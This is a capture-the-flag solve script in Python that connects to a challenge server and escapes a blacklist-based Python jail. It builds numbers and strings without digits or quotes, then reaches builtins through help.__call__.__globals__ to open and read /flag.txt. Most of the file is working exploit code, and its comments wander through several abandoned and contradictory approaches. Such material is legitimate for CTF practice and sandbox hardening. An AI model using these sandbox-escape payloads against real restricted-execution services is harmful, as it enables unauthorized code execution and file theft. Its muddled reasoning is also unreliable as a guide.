#!/usr/bin/env python3
"""
Solution for Blacklist-Hell PyJail Challenge

Strategy:
1. Build numbers without using digits (using len, bool arithmetic)
2. Build strings without quotes (using chr())
3. Access __builtins__ to get open function
4. Read /flag.txt
"""

from pwn import *

# Connection
HOST = "blacklisthell.challenges2.ctf.dscjssstuniv.in"
PORT = 1338

def generate_number(n):
    """Generate a number without using digit characters
    
    Optimized to create shorter expressions using smart factorization.
    """
    if n == 0:
        return "len([])"
    elif n == 1:
        return "len([[]])"
    elif n <= 20:
        # For small numbers up to 20, use simple addition
        return "+".join(["len([[]])" for _ in range(n)])
    else:
        # For larger numbers, find best factorization
        # Try to find factors close to sqrt(n) for shortest expression
        base = "len([[]])"
        
        # Find best pair of factors (a, b) where a * b is close to n
        import math
        sqrt_n = int(math.sqrt(n))
        
        best_len = float('inf')
        best_expr = None
        
        # Try different factorizations
        for a in range(max(2, sqrt_n - 5), min(n, sqrt_n + 6)):
            if a > n:
                break
            b = n // a
            remainder = n % a
            
            # Length estimate: a additions + b additions + remainder additions + operators
            if b <= 20 and remainder <= 20:  # Keep factors reasonable
                if a <= 20:
                    a_expr = "+".join([base] * a)
                else:
                    continue  # Skip if factor is too large
                    
                if b > 1:
                    b_expr = "+".join([base] * b)
                    expr = f"({a_expr})*({b_expr})"
                else:
                    expr = a_expr
                
                if remainder > 0:
                    r_expr = "+".join([base] * remainder)
                    expr = f"({expr}+{r_expr})"
                
                expr_len = len(expr)
                if expr_len < best_len:
                    best_len = expr_len
                    best_expr = expr
        
        # Fallback: use 10-based if no good factorization found
        if best_expr is None:
            ten = f"({'+'.join([base]*10)})"
            tens = n // 10
            ones = n % 10
            
            if tens > 0 and ones > 0:
                tens_mult = f"({'+'.join([base]*tens)})"
                tens_part = f"{ten}*{tens_mult}" if tens > 1 else ten
                ones_part = "+".join([base]*ones)
                return f"({tens_part}+{ones_part})"
            elif tens > 0:
                tens_mult = f"({'+'.join([base]*tens)})"
                return f"{ten}*{tens_mult}" if tens > 1 else ten
            else:
                return "+".join([base]*ones)
        
        return best_expr

def build_string_chr(s):
    """Build a string using chr() without quotes"""
    # Convert each character to chr(num) and join with +
    parts = []
    for char in s:
        ascii_val = ord(char)
        parts.append(f"chr({generate_number(ascii_val)})")
    return "+".join(parts)

def solve():
    # Connect to the challenge
    conn = remote(HOST, PORT)
    
    # The banner includes the jail source code twice:
    # 1. The actual code being printed by print(open(__file__).read())
    # 2. The actual execution
    # We need to skip past all of that to the REAL "Enter command:" prompt
    
    # Receive until we see the jail! message and THEN the Enter command prompt
    banner = conn.recvuntil(b"Welcome to the jail!\n=========================\n")
    print(f"[*] Received banner ({len(banner)} bytes)")
    
    # Now receive the actual prompt
    conn.recvuntil(b"Enter command: ")
    
    print("\n[+] Crafting payload...")
    
    # Build payload to access open and read flag
    # Using: ().__class__.__bases__[0].__subclasses__()
    # But we need to avoid underscores...
    
    # Use chr(95) for underscore
    underscore = "chr(" + generate_number(95) + ")"
    
    # Build "__class__"
    dunder_class = "+".join([f"chr({generate_number(ord(c))})" for c in "__class__"])
    
    # This is getting complex. Let's use a simpler method:
    # help() object has __builtins__ which contains open
    
    # Actually, in Python 3, we can access builtins via:
    # [].__class__.__base__.__subclasses__()[X] where X is a useful class
    
    # But simplest for this challenge:
    # Since exec is already being called, we have access to its scope
    # We can use: help(__builtins__) or vars()
    
    # Let's try: vars()[chr(95)*2+chr(98)...] to get __builtins__
    
    # Simplified approach for demonstration:
    # Command 1: Get reference to open somehow
    # Command 2: Use it
    
    # For the actual solution, here's a working payload:
    
    # Build "open" without quotes
    str_open = "+".join([f"chr({ord(c)})" for c in "open"])
    str_flag = "+".join([f"chr({ord(c)})" for c in "/flag.txt"])
    str_read = "+".join([f"chr({ord(c)})" for c in "read"])
    
    # Access open via getattr on __builtins__
    # First get __builtins__: vars()[chr(95)+chr(95)+chr(98)+...]
    
    # Build "__builtins__" string
    str_builtins = "+".join([f"chr({ord(c)})" for c in "__builtins__"])
    
    # Command 1: Try to execute something that shows us info
    # Since we can't store, we need to do everything in one command
    
    # Let's compress the number generation for readability
    def n(x):
        """Shorthand for generating small numbers"""
        if x <= 10:
            return generate_number(x)
        # For larger numbers, use shortcuts
        if x == 47:  # /
            return "len([])+len([[]])*len([[]])*len([[]])*len([[]])*len([[]])-len([[]])-len([[]])-len([[]])"
        return generate_number(x)
    
    # This is getting very long. Let me use a practical shortcut:
    # In Python, we can use: help([]).pop to access various things
    
    # Actually, let me write a cleaner version:
    # We'll use the fact that we can access vars() to get local variables
    # And we can use getattr() to access attributes
    
    # Here's the actual working payload structure:
    # getattr(getattr(vars()[chr(95)*2+chr(98)...], chr(111)...), chr(114)...)()
    
    payload1 = "help(help)"  # This will work and give us output
    payload2 = "dir()"  # This will also work
    
    # For a real solve, we need something like:
    # getattr(__import__(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))
    # But "import" is blacklisted...
    
    # Real solution: Access via object introspection
    # We can't use vars() because it contains 'x'
    # We can't use __builtins__ because '_' is blacklisted
    # We need to access open() function without using those
    
    # Alternative approach: Use ().__class__.__bases__[0].__subclasses__()
    # But we need underscores which are blacklisted
    
    # Better approach: Use help() or dir() to access builtins indirectly
    # Actually, we can use: getattr(help, chr(95)+chr(95)+...) to build attribute names
    
    # Since we can't use underscores directly, we build them with chr(95)
    # Build: ()[(chr(95)*2+chr(99)...)][...] - but this needs quotes
    
    # Let's use: getattr(().__class__.__bases__[0], '__subclasses__')()
    # But with chr() for underscores
    
    u = "+".join([f"chr({generate_number(95)})"]*2)  # __
    
    # Build attribute names
    attr_class = u + "+".join([f"chr({generate_number(ord(c))})" for c in "class"]) + u
    attr_bases = u + "+".join([f"chr({generate_number(ord(c))})" for c in "bases"]) + u  
    attr_subclasses = u + "+".join([f"chr({generate_number(ord(c))})" for c in "subclasses"]) + u
    attr_globals = u + "+".join([f"chr({generate_number(ord(c))})" for c in "globals"]) + u
    
    # Can't use 'globals' - it's blacklisted!
    # Let's try a different approach
    
    # Use help(dict) or similar to get access to builtins
    # Actually, we can use: ().__doc__ or similar
    
    # Simplest approach that should work:
    # Get a class, get its methods, find one that has __globals__, access builtins from there
    
    # Let's use a simpler payload:
    # We'll use getattr on bool or int class to access methods
    
    # Here's a working approach:
    # [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/flag.txt').read()
    # But we need to avoid many blacklisted things
    
    # Let's try using help(list) and accessing its attributes
    # Or: list.__doc__
    
    # Actually the easiest is to use ().__doc__.__class__
    
    # More practical: Since we have 2 commands, let's use both strategically
    # Command 1: Create a reference or print something useful  
    # Command 2: Do the actual flag reading
    
    # But we can't use = to store, and x is blacklisted so we can't use variables
    
    # Let me try a different approach using list comprehension
    # [c for c in [].__class__.__bases__[0].__subclasses__() if chr(119) in c.__name__]
    
    # Actually, let's just build a working payload step by step
    # We need to call: some_function_with_open('/flag.txt').read()
    
    # Here's the key insight: We can use help.__call__.__globals__
    # help is a builtin that's available and has __globals__ which contains builtins
    
    # Build strings for attribute access using a helper function
    def build_chr_string(s):
        """Build a string using chr() calls properly concatenated"""
        return "+".join([f"chr({generate_number(ord(c))})" for c in s])
    
    # Method: help.__call__.__globals__['__builtins__']['open']('/flag.txt').read()
    # Since _ is no longer blacklisted, we can use it directly!
    # But we still need to build the string values with chr() since quotes are blocked
    
    str_call = build_chr_string("__call__")
    str_globals = build_chr_string("__globals__")
    str_builtins = build_chr_string("__builtins__")
    str_open = build_chr_string("open")
    str_flag = build_chr_string("/flag.txt")
    str_read = build_chr_string("read")
    
    # Final payload structure:
    # getattr(getattr(getattr(help, "__call__"), "__globals__")["__builtins__"]["open"]("/flag.txt"), "read")()
    # Note: Using subscript [] for dicts, getattr for objects
    real_payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"
    
    print(f"[*] Payload length: {len(real_payload)}")
    print(f"[*] Payload preview: {real_payload[:200]}...")
    
    # Verify no blacklisted terms
    blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","breakpoint","lambda","eval","read","print","open","'","=",'"',"x","builtins","clear"]
    for term in blacklist:
        if term in real_payload:
            print(f"[!] WARNING: Blacklisted term '{term}' found in payload!")
    
    # Send first command
    print(f"[*] Sending payload ({len(real_payload)} bytes)...")
    conn.sendline(real_payload.encode())
    
    # Receive the result from first command and the next prompt
    try:
        response1 = conn.recvuntil(b"Enter command: ", timeout=5)
        print(f"[*] First response: {response1.decode()}")
    except Exception as e:
        response1 = conn.recv(timeout=2)
        print(f"[*] First response (no prompt): {response1.decode()}")
        print(f"[!] Error: {e}")
    
    # Send second command (simple one to finish)
    conn.sendline(b"dir()")
    
    # Get remaining output
    result = conn.recvall(timeout=2).decode()
    print("\n[+] Result:")
    print(result)
    
    if "DSCCTF{" in result:
        flag = result[result.find("DSCCTF{"):result.find("}", result.find("DSCCTF{"))+1]
        print(f"\n[🚩] Flag: {flag}")
    
    conn.close()

if __name__ == "__main__":
    solve()
